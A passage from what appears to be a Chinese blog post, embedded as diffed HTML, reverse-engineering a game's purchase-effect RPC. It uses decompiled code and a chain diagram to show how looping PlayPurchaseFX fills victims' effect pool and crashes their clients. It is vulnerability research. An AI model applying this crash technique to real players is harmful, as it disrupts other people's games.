+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  {</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( </span><span style="color:#6F42C1;--shiki-dark:#B392F0">NetRpc::IsSourceValid</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(game: p_game, delivery: p_rpc->delivery, expectedPlayerId: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">p_rpc->playerId) )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      avatarBarn </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> p_game->avatarBarn;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      playerId </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> p_rpc->playerId;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      sourceAvatar </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> AvatarBarn::GetAvatarByPlayerId</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(avatarPool: avatarBarn, playerIdCarrier: playerId, allowType5: </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( sourceAvatar </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> nullptr </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (</span><span style="color:#6F42C1;--shiki-dark:#B392F0">sub_22193CC</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: sourceAvatar) </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">==</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      {</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( </span><span style="color:#6F42C1;--shiki-dark:#B392F0">Avatar_HasDisplayableRole</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(avatar: sourceAvatar) )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">          event </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> EventBarn_CreatePurchaseFx</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(barn: p_game->eventBarn, maximum: </span><span style="color:#D73A49;--shiki-dark:#F97583">-</span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">          event->playerId </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> p_rpc->playerId;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">          event->stuffType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> p_rpc->stuffType;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">          sub_12DB8B4</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: event </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 38</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, s: p_rpc->sku);</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">          for</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( i </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">; i </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x3C;</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> p_rpc->itemCount; </span><span style="color:#D73A49;--shiki-dark:#F97583">++</span><span style="color:#24292E;--shiki-dark:#E1E4E8">i )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">          {</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">            PurchaseFxItem_Construct</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">item);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">            item.stuffType </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> p_rpc->items[i][</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">            item.value </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> p_rpc->items[i][</span><span style="color:#005CC5;--shiki-dark:#79B8FF">1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">            PurchaseFx_AppendItem</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(fx: event, </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">item);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">          }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">          v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">          Event::Start</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(event, diagnosticCarrier: </span><span style="color:#D73A49;--shiki-dark:#F97583">0x</span><span style="color:#005CC5;--shiki-dark:#79B8FF">FA</span><span style="color:#D73A49;--shiki-dark:#F97583">u</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">          v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">        else</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">          v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      }</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      else</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">        v9 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  }</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">}</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">c</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="void __fastcall PurchaseFxRpc::Run(const PurchaseFxRpc *rpc, Game *game)
+{
+  // [COLLAPSED LOCAL DECLARATIONS. PRESS NUMPAD &#x22;+&#x22; TO EXPAND]
+
+  receivedRpc = rpc;
+  p_game = game;
+  p_rpc = rpc;
+  if ( (WORD5(xmmword_4D265C4) &#x26; 0x2440) != 0
+    || ((v11 = xxx_dispatch(argument0: rpc), v11.handled == 0)
+      ? (v9 = 0)
+      : (v10 = v11, sub_221932C(a1: v11.value, a2: v11.handled), v9 = 1),
+        v9 == 0) )
+  {
+    if ( NetRpc::IsSourceValid(game: p_game, delivery: p_rpc->delivery, expectedPlayerId: &#x26;p_rpc->playerId) )
+    {
+      avatarBarn = p_game->avatarBarn;
+      playerId = p_rpc->playerId;
+      sourceAvatar = AvatarBarn::GetAvatarByPlayerId(avatarPool: avatarBarn, playerIdCarrier: playerId, allowType5: 0);
+      if ( sourceAvatar != nullptr &#x26;&#x26; (sub_22193CC(a1: sourceAvatar) &#x26; 1) == 0 )
+      {
+        if ( Avatar_HasDisplayableRole(avatar: sourceAvatar) )
+        {
+          event = EventBarn_CreatePurchaseFx(barn: p_game->eventBarn, maximum: -1);
+          event->playerId = p_rpc->playerId;
+          event->stuffType = p_rpc->stuffType;
+          sub_12DB8B4(a1: event + 38, s: p_rpc->sku);
+          for ( i = 0; i < p_rpc->itemCount; ++i )
+          {
+            PurchaseFxItem_Construct(&#x26;item);
+            item.stuffType = p_rpc->items[i][0];
+            item.value = p_rpc->items[i][1];
+            PurchaseFx_AppendItem(fx: event, &#x26;item);
+          }
+          v9 = 2;
+          Event::Start(event, diagnosticCarrier: 0xFAu);
+          v9 = 0;
+        }
+        else
+        {
+          v9 = 1;
+        }
+      }
+      else
+      {
+        v9 = 1;
+      }
+    }
+  }
+}" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button><button class="collapse-toggle bg-card text-muted-foreground rounded-lg m-2" aria-label="Toggle collapse code block" onclick="this.parentElement.classList.toggle(&#x27;collapsed&#x27;)"><svg class="size-5"><use href="/icons/code.svg#mingcute-arrow-down-line"></use></svg><span class="desc"> code</span></button><div class="collapse-fade"></div></div>
+<p>所以大致是这么一个链路</p>
+<div class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><pre><code><span class="line"><span>攻击者                         服务端                      受害者</span></span>
+<span class="line"><span>Lua 循环 PlayPurchaseFX</span></span>
+<span class="line"><span>  → 子事件（stuffType=8）</span></span>
+<span class="line"><span>  → 本地占一个池对象</span></span>
+<span class="line"><span>  → 发 PurchaseFxRpc   ────→  转发   ────→  PurchaseFxRpc::Execute</span></span>
+<span class="line"><span>                                              → 新事件（stuffType=8）</span></span>
+<span class="line"><span>                                              → 占一个池对象</span></span>
+<span class="line"><span>                                              → 池满</span></span>
+<span class="line"><span>                                              → WingBuffVisual::Initialize(nullptr)</span></span>
+<span class="line"><span>                                              → 崩溃</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">plaintext</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="攻击者                         服务端                      受害者
+Lua 循环 PlayPurchaseFX
+  → 子事件（stuffType=8）
+  → 本地占一个池对象
+  → 发 PurchaseFxRpc   ────→  转发   ────→  PurchaseFxRpc::Execute
+                                              → 新事件（stuffType=8）
+                                              → 占一个池对象
+                                              → 池满
+                                              → WingBuffVisual::Initialize(nullptr)
+                                              → 崩溃" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button></div>
+<p>那么 <code>purchaseFxPool</code> 为什么会满而不会自己清理呢</p>
+<p>回到 <code>PurchaseFx::Update</code> 里，fx->elapsed 是每帧累加事件的存活时间，<code>PurchaseFx</code> 的整个生命周期都靠它驱动</p>
+<div class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><pre><code><span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">fx</span><span style="color:#D73A49;--shiki-dark:#F97583">-></span><span style="color:#24292E;--shiki-dark:#E1E4E8">elapsed </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx</span><span style="color:#D73A49;--shiki-dark:#F97583">-></span><span style="color:#24292E;--shiki-dark:#E1E4E8">elapsed </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> deltaTime;</span></span></code></pre><span class="language ps-1 pe-3 text-sm bg-muted text-muted-foreground">c</span><button class="copy text-muted-foreground p-1 box-content border rounded-lg bg-card" aria-label="Copy code" data-code="fx->elapsed = fx->elapsed + deltaTime;" onclick="
+          navigator.clipboard.writeText(this.dataset.code);
+          this.classList.add(&#x27;copied&#x27;);
+          setTimeout(() => this.classList.remove(&#x27;copied&#x27;), 2000)
+        "><div class="ready"><svg class="size-5"><use href="/icons/code.svg#mingcute-clipboard-line"></use></svg></div><div class="success hidden"><svg class="size-5"><use href="/icons/code.svg#mingcute-file-check-line"></use></svg></div></button></div>
+<p>把 <code>j = 0 </code>带入计算， 第 0 个item的 release 条件是 <code>elapsed / 4.0 > 0.95</code>，意味着至少要到 3.8 秒才会释放</p>
+<div class="astro-code astro-code-themes github-light github-dark collapsed" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="c"><pre><code><span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">float</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> __fastcall </span><span style="color:#6F42C1;--shiki-dark:#B392F0">clamp01</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">float</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#E36209;--shiki-dark:#FFAB70">a1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  return</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> fminf</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#6F42C1;--shiki-dark:#B392F0">fmaxf</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#24292E;--shiki-dark:#E1E4E8">a1, </span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">), </span><span style="color:#005CC5;--shiki-dark:#79B8FF">1.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">float</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> __fastcall </span><span style="color:#6F42C1;--shiki-dark:#B392F0">lerp</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">float</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#E36209;--shiki-dark:#FFAB70">a1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, </span><span style="color:#D73A49;--shiki-dark:#F97583">float</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#E36209;--shiki-dark:#FFAB70">a2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, </span><span style="color:#D73A49;--shiki-dark:#F97583">float</span><span style="color:#E36209;--shiki-dark:#FFAB70"> a3</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  return</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">a1 </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ((</span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#24292E;--shiki-dark:#E1E4E8">a2 </span><span style="color:#D73A49;--shiki-dark:#F97583">-</span><span style="color:#D73A49;--shiki-dark:#F97583"> *</span><span style="color:#24292E;--shiki-dark:#E1E4E8">a1) </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> a3);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">}</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">void</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> __fastcall PurchaseFx::</span><span style="color:#6F42C1;--shiki-dark:#B392F0">Update</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(PurchaseFx </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">fx</span><span style="color:#24292E;--shiki-dark:#E1E4E8">, Game </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#E36209;--shiki-dark:#FFAB70">game</span><span style="color:#24292E;--shiki-dark:#E1E4E8">)</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">{</span></span>
+<span class="line"><span style="color:#6A737D;--shiki-dark:#6A737D">  // ...</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">  for</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( j </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">; j </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x3C;</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx->itemCount; </span><span style="color:#D73A49;--shiki-dark:#F97583">++</span><span style="color:#24292E;--shiki-dark:#E1E4E8">j )</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">  {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    item </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#D73A49;--shiki-dark:#F97583"> &#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">fx->items[j];</span></span>
+<span class="line"><span style="color:#E36209;--shiki-dark:#FFAB70">    v290</span><span style="color:#24292E;--shiki-dark:#E1E4E8">[fx->items[j].value] </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 1</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">a2 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#D73A49;--shiki-dark:#F97583">u</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">    sub_22192DC</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(</span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">a1, </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">a2);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    v273 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> j </span><span style="color:#D73A49;--shiki-dark:#F97583">/</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> fx->itemCount;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    v271 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (fx->elapsed </span><span style="color:#D73A49;--shiki-dark:#F97583">/</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 4.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">-</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v273 </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.3</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    progress </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> clamp01</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v271);</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">    if</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> ( j </span><span style="color:#D73A49;--shiki-dark:#F97583">!=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> )</span><span style="color:#6A737D;--shiki-dark:#6A737D"> // 光翼的动画只有一个item，所以这里的分支走else，实际上实在计算光效位置，可以忽略</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">    {</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v260 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (progress </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#D73A49;--shiki-dark:#F97583"> -</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0.9</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">/</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.1</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v261 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.2</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#D73A49;--shiki-dark:#F97583"> -</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (</span><span style="color:#6F42C1;--shiki-dark:#B392F0">clamp01</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v260) </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.2</span><span style="color:#D73A49;--shiki-dark:#F97583">f</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      x </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (fx->elapsed </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 3.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">) </span><span style="color:#D73A49;--shiki-dark:#F97583">+</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> (v273 </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 57.0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v257 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 2.5</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v256 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#005CC5;--shiki-dark:#79B8FF"> 0.25</span><span style="color:#24292E;--shiki-dark:#E1E4E8">;</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v258 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> lerp</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v257, a2: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v256, a3: progress);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      sincosf</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(x, </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">sinx, </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">cosx);</span><span style="color:#6A737D;--shiki-dark:#6A737D"> // 多个item时动画效果是绕圈下落的</span></span>
+<span class="line"><span style="color:#D73A49;--shiki-dark:#F97583">      *&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v53 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> cosx </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v261;</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      sub_1B29D38</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: v253.n128_u64, result: v53, a3: v258, a4: sinx </span><span style="color:#D73A49;--shiki-dark:#F97583">*</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v261);</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v54 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#6F42C1;--shiki-dark:#B392F0"> sub_2219E18</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(a1: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v288, a2: </span><span style="color:#D73A49;--shiki-dark:#F97583">&#x26;</span><span style="color:#24292E;--shiki-dark:#E1E4E8">v253);</span></span>
+<span class="line"><span style="color:#6F42C1;--shiki-dark:#B392F0">      LODWORD</span><span style="color:#24292E;--shiki-dark:#E1E4E8">(v255) </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v54.n128_u32[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">2</span><span style="color:#24292E;--shiki-dark:#E1E4E8">];</span></span>
+<span class="line"><span style="color:#24292E;--shiki-dark:#E1E4E8">      v254 </span><span style="color:#D73A49;--shiki-dark:#F97583">=</span><span style="color:#24292E;--shiki-dark:#E1E4E8"> v54.n128_u64[</span><span style="color:#005CC5;--shiki-dark:#79B8FF">0</span><span style="color:#24292E;--shiki-dark:#E1E4E8">];</span></span>
